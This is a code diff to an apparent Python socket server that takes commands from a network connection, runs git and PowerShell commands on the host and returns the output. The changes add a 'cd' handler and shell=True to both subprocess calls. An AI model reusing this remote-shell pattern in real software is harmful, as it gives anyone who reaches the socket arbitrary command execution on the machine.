@@ -24,7 +24,7 @@ while True:
             print(f"{command} Is not a command!")
             break
 
-        if command == "q!":
+        if command == "q!" or command == "Q!":  # Fix condition for termination
             conn.close()
             break
 
@@ -32,6 +32,16 @@ while True:
         cmd_parts = command.split()
         cmd = cmd_parts[0]
         args = cmd_parts[1:]
+
+        if cmd == "cd":
+            try:
+                os.chdir(args[0])
+                # Get the current working directory
+                current_dir = os.getcwd()
+                response = f"\nCWD change to:\n{current_dir}\n"
+                conn.sendall(response.encode())
+            except Exception as e:
+                conn.sendall(str(e).encode())
 
         if cmd.startswith('git'):
             try:
@@ -41,7 +51,8 @@ while True:
                     git_command,
                     capture_output=True,
                     text=True,
-                    cwd=os.getcwd()
+                    cwd=os.getcwd(),
+                    shell=True  # Add shell=True for executing git commands
                 )
 
                 # Get the command output and return code
@@ -61,7 +72,8 @@ while True:
                     powershell_command,
                     capture_output=True,
                     text=True,
-                    cwd=os.getcwd()
+                    cwd=os.getcwd(),
+                    shell=True  # Add shell=True for executing PowerShell commands
                 )
 
                 # Get the command output and return code
